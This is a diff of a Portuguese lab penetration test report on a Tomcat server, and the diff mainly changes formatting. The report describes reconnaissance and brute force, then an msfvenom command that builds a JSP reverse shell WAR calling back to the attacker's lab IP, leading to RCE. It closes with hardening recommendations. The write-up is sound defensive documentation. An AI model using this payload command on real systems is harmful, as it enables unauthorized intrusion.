@@ -6,7 +6,9 @@ O teste foi realizado no dia 06/03/2026 em um ambiente de laboratório controlad
 Foram utilziadas  as ferramentas netdiscover, nmap, feroxbuster e metasploit framework.
 Durante o teste de intrusão foi identificado um serviço web vulnerável. A exposição do painel administrativo Tomcat Manager permitiu o upload de uma aplicação maliciosa contendo um payload de reverse shell, resultando em execução remota de código (RCE) no servidor.
 
+
 ##Tabela de Vulnerabilidades
+
 Vulnerabilidade	Severidade	Vetor de Ataque	Status
 
 Execução Remota de Código (RCE)	Crítica (9.8)	Upload de WAR via Tomcat Manager	Explorada
@@ -21,6 +23,7 @@ Exposição de Painel Administrativo	Média (5.3)	Reconhecimento Web / Feroxbust
 O processo iniciou com o uso do netdiscover, identificando o host alvo no IP 192.168.56.102. Subsequentemente, o nmap revelou os seguintes serviços ativos:
 
 Porta 22/TCP: OpenSSH 7.6p1.
+
 Porta 8080/TCP: Apache Tomcat 9.0.52.
 
 Descoberta de Diretórios e Brute Force
@@ -36,8 +39,10 @@ msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f war > 
 
 O arquivo shell.war foi implantado (deploy) no servidor. Após a execução, foi estabelecida uma conexão reversa, resultando em uma shell interativa como o usuário tomcat no host miletus.
 
-##Evidências Técnicas
+
+#Evidências Técnicas
 ##Reconhecimento
+
 A ferramenta netdiscover foi utilizada para identificar o IP alvo que foi identificado com sucesso.
 
  <img width="886" height="184" alt="image" src="https://github.com/user-attachments/assets/72a91613-d83a-4293-8c82-ba819c9e25c9" />
@@ -75,25 +80,44 @@ Após a execução do arquivo no servidor, foi estabelecida uma conexão reversa
 
 
 ##Recomendações de Segurança
+
 Remover ou restringir o acesso ao Tomcat Manager
+
 O painel administrativo do Apache Tomcat Manager não deve estar exposto publicamente na rede.
+
 Recomenda-se restringir o acesso apenas a endereços IP autorizados ou à rede interna da organização.
+
 Utilizar senhas fortes e únicas
+
 Foi possível obter credenciais válidas do serviço.
 Recomenda-se implementar Senhas complexas, política de troca periódica de senha e Proibição de credenciais padrão
 
 
 ##Implementar proteção contra força bruta
-Ferramentas automatizadas como o Metasploit Framework podem realizar múltiplas tentativas de autenticação. Recomenda-se Bloqueio temporário após várias tentativas de login, rate limiting e monitoramento de tentativas de autenticação
+
+Ferramentas automatizadas como o Metasploit Framework podem realizar múltiplas tentativas de autenticação. 
+
+Recomenda-se Bloqueio temporário após várias tentativas de login, rate limiting e monitoramento de tentativas de autenticação
+
 Desabilitar funcionalidades desnecessárias
+
 Caso o Tomcat Manager não seja essencial para o ambiente de produção, recomenda-se sua remoção ou desativação, reduzindo a superfície de ataque.
 
+
 ##Implementar monitoramento e logs
+
 Recomenda-se habilitar:
+
 •	Monitoramento de acesso ao painel administrativo
+
 •	Logs de autenticação
+
 •	Alertas para atividades suspeitas
+
 Isso permite identificar tentativas de exploração de forma antecipada.
 
+
 ##Atualizar o servidor e aplicar patches
+
 Manter o Apache Tomcat e sistema operacional sempre atualizados com as últimas correções de segurança para evitar exploração de vulnerabilidades conhecidas.
+
